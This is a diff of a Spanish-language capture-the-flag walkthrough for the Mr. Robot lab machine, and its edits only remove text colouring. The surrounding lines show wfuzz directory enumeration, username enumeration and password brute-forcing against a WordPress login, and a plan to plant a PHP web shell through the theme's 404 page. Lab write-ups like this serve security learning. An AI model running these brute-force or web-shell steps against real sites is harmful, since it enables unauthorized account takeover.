@@ -26,7 +26,7 @@ ahora vamos a hacer un reconocimiento de puertos abiertos. </p>
 * <p>Vemos que tiene el puerto <font color="lime">80/http</font> y el <font color="lime">444/tcp,</font> ahora vamos a ver el puerto 80 http a ver que nos informa.</p>
 >
 <img src="/imgs/mrRobot/mrRobot3.png"/>
-* <p> Si vemos detalladamente todo, observaremos que no mostrara nada relevante, por lo tanto pasamos a la enumeración de <font color="gold"><bold>"DirectoriosActivos"</bold></font>.</p>
+* <p> Si vemos detalladamente todo, observaremos que no mostrara nada relevante, por lo tanto pasamos a la enumeración de "DirectoriosActivos" .</p>
 > wfuzz -t 200 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.94.16/FUZZ
 >
 <img src="/imgs/mrRobot/mrRobot4.png"/>
@@ -49,11 +49,11 @@ robots.txt | wp-login.php, del resto solo es codigo de estado 301, ahora vamos a
 > wfuzz -t 200 -c --hs "Invalid username" -z file,fsocity.dic  -d "log=FUZZ&pwd=NULL" http://10.10.94.16/wp-login.php
 >
 <img src="/imgs/mrRobot/mrRobot9.png"/>
-* <p>Ok tenemos ya el username <font color="yellow">Eliot</font>, nos falta ahora la contraseña, hagamos de nuevo lo mismo.</p>
+* <p>Ok tenemos ya el username Eliot nos falta ahora la contraseña, hagamos de nuevo lo mismo.</p>
 > wfuzz -t 200 -c --hc=200  -z file,fsocity.dic -d "log=Elliot&pwd=FUZZ" http://10.10.94.16/wp-login.php
 >
 <img src="/imgs/mrRobot/mrRobot10.png"/>
-* <p>Ok listo ahora tenemos la contraseña del usuario <font color="yellow">Elliot</font>, ahora solo queda iniciar session en el <font color="yellow">wp-login.php</font>.</p>
+* <p>Ok listo ahora tenemos la contraseña del usuario Elliot, ahora solo queda iniciar session en el wp-login.php.</p>
 >
 <img src="/imgs/mrRobot/mrRobot11.png"/>
 * <p>Una vez adentro tenemos que ganar acceso por medio de una web-shell, para ello me ire a apariencia y la seccion 404. quitare todo el codigo php y lo remplazare por el siguiente</p>
